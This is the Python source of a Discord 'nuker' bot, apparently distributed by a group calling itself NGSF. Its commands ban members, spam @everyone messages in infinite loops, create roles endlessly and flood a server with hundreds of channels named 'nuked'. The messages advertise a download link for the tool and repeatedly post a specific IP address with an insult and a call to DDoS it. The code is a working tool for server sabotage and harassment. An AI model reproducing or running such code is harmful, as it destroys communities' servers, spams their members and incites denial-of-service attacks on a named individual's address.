import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
 
 
 
 
 ##THIS BOT IS NOT WORKING ANYMORE##
 
##PREFIX##


 
bot = commands.Bot(command_prefix='.ngsf-')
 
client = commands.Bot(command_prefix='.ngsf-')
 
##OTHER##
bot.remove_command('help')
 
 
 
##BOT IS READY##
@bot.event
async def on_ready():
#BOT STATUS#
    print("t'es prêt pour faire du sale ? ")
    print("Ok gros chu co !")
 
 
 
##BAN COMMAND##
@bot.command(pass_context=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()
 
 
##SPAM COMMAND##
@bot.command(pass_context=True)
async def spam(ctx): #run "!spam" to run the command
    await ctx.message.delete()
    while True:
        await ctx.send("Hacked by NGSF https://discord.gg/jwyb63N @everyone")
        await ctx.send("Hacked by NGSF https://discord.gg/jwyb63N @everyone")
        await ctx.send("Hacked by NGSF https://discord.gg/jwyb63N @everyone")
        await ctx.send("Hacked by NGSF https://discord.gg/jwyb63N @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("88.121.178.164 = FDP GO DDOS @everyone")
        await ctx.send("Download me at : https://link-to.net/75999/discordnukerbot\nhttps://link-to.net/75999/discordnukerbot @everyone")
        await ctx.send("Download me at : https://link-to.net/75999/discordnukerbot\nhttps://link-to.net/75999/discordnukerbot @everyone")
        await ctx.send("Download me at : https://link-to.net/75999/discordnukerbot\nhttps://link-to.net/75999/discordnukerbot @everyone")
        await ctx.send("Download me at : https://link-to.net/75999/discordnukerbot\nhttps://link-to.net/75999/discordnukerbot @everyone")
        await ctx.send("Download me at : https://link-to.net/75999/discordnukerbot\nhttps://link-to.net/75999/discordnukerbot @everyone")
        await ctx.send("Download me at : https://link-to.net/75999/discordnukerbot\nhttps://link-to.net/75999/discordnukerbot @everyone")
        await ctx.send("Download me at : https://link-to.net/75999/discordnukerbot\nhttps://link-to.net/75999/discordnukerbot @everyone")
       
##SPAM ROLE##
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="HackEd HackEdackEd HackEd HackEd HhackedhackedckEd HackEd HackEd")
 
 
 
##MAKE CHANNELS##
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('nuked') #you can change the channel name by replacing 'nuked' to any name
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('https://link-to.net/75999/discordnukerbot')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('https://link-to.net/75999/discordnukerbot')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('88.121.178.164')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('NGSF > ALL')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('https://link-to.net/75999/discordnukerbot')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('https://link-to.net/75999/discordnukerbot')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('https://link-to.net/75999/discordnukerbot')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('https://link-to.net/75999/discordnukerbot')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
    await guild.create_text_channel('nuked')
 
 
 
 
##BOT TOKEN##
bot.run ("TOKEN HERE")
